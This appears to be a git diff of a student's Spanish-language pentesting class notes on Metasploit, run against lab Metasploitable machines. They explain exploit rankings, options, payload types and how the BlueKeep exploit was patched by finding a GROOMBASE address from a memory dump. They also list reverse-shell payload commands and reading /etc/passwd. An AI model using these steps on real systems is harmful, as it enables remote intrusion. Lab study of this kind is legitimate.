@@ -529,11 +529,22 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  el exploit que usamos fue uno enfocado en tomar el control del objetivo, lo buscamos en linea lo modificamos y seguimos las instrucciones para que funcionara de manera correcta, asi pudimos obtener acceso a nuestra mauqina local
  metasploitable ubuntu y incluso ver algunos ficheros que tiene dicha maquina 
 # Clase practica dia 22 09/10/2024
+# Clase practica dia 23 /10/2024
 ## Metasploit
  - Es una herramienta/Framework tiene implementado un conjunto de exploits para todas las vulnerabilidades que van saliendo tambien se le puede implementar un modulo y el lo almacenara de forma automatica.
  Tambien tiene herramientas auxiliares que nos permiten realzar toda la fase de lanzamiento del exploit manejo de la conexion, herramientas de pos explotacion, es un entorno completo que nos facilita la creacion de exploits
  el uso de diferentes payloads, recibir la conexion manejarla etc... metasploit se fundamenta en el concepto modulo cada uno de los exploits se corresponden con un modulo, la unidad basica de metasploit son los modulos tambien
  tiene plugings, tenemos scripts, bases de datos, librerias. tambien nos permite juntar payloads con exploits, Metasploit usa el lenguaje de programacion ruby
+## Informacionimportante Metasploit
+ - Funcionamiento -> al buscar un exploit en especifico podremos observar si dicho exploit tiene una funcionalidad buena, excelente, mala, o manual, es importante que al momento de usarlo tener muy precente esta inforamcion ya que si el exploit tiene un uso excelente
+ no va haber amyor problema al ejecutarlo, pero si por lo contrario tiene en este caso manual como lo es en el exploit *windows/rdp/cve_2019_0708_bluekeep_rce* tendremos que modificar el exploit para que funcione de manera correcta
+ - Opciones -> tenemos que tener muy en cuenta las opciones o los requerimientos que nos pide el exploit para poderse ejecutar estos los podremos por con el comando *Show options* alli podremos ver todas las opciones del programa y modificar ya sea el rhos, lhost, lport, rport
+ etc... Todas las opciones reuqeridas para el funcionamiento del exploit tendran un yes, asi sabremos cuales tenemos que modificar o agregar de manera obligatoria para su correcto funcionamiento
+ - Modificacion de los exploits -> Para la modificacion de exploit *exploit/windows/cve_2019_0708_bluekeep_rce* que al lanzarlo contra el objetivo metasploitable windows, crasheaba el sistema operativo por que trataba de obtener una parte de la memoria inaxecible
+ tuvimos que acceder al exploit y modificarlo con emacs, tendremos que modificar el groombase de el area de trabajo mas parecido al de nuestro objetivo, para poder conocer la direccion de la memoria que no esta realizando paginacion, usamos distintas pruebas pero al final lologramos de manera manual
+ usamos el programa vmss2core desde nuestro equipo host, tambien necesitamos un debuger en este caso para windosw windbg, usaremos los ficheros propios de vmware, los cuales modificaremos desde el cmd de windows, para realizar un volcado de la memoria para asi realizar un analissi y encontrar la parte de la memoria
+ que no esta conpaginando, con la direccion que obtengamos, usaremos emacs de nuevo desde nuestro kali linux para modificar la parte de la memoria que no estaba conpaginando, poner la parte de la memoria que si esta conpaginando
+ - Payloads -> No todos los exploits dependen de un payload para su funcionamiento hay diversos tipos de exploit que podremos aprovechar sin el uso de payloads como **  y otros que dependen de uno para su funcionamiento como *use exploit/windows/cve_2019_0708_bluekeep_rce*
 ### Payloads 
  - singles -> payloads autocontenidos y autosuficientes no nececitan de metasploit para funcionar, ejemplo si tenemos un payload que nos devuelve una conexion podremos recibirla con la herramienta que queramos; recibir una conexion inversa, añadir un usuario 
  - stagers -> son payloads pequeños para tareas especificas que nos permiten establecer una conexion con una maquina y nos devuelven una conexion reversa y descarga o aprovecha algun payload de tipo stages para realizar alguna accion (Depende mucho mas de metasploit)
@@ -548,6 +559,7 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  - exploit -> Nos permite ejecutar el exploit 
  - show payloads -> Nos permite observar todos los payloads compatibles con el exploit
  - sessions -> Nos muetsra las sesiones que tenemos activas
+ - msfconsole -> Con este comando accedemos a la consola de metasploit
 ### Ejemplos Metasploit
  - set rhost 192.168.157.128
  - set lhost 192.168.157.130
@@ -556,5 +568,6 @@ Google hace uso de los operadores booleanos para realizar búsquedas combinadas 
  - set payload cmd/unix/generic
  - set payload cmd/unix/reverse
  - exploit
+ - use exploit/windows/cve_2019_0708_bluekeep_rce
 ### Comandos importantes dentro de la maquina 
  - /etc/passwd -> Nos muestra los usuarios e informacion importante
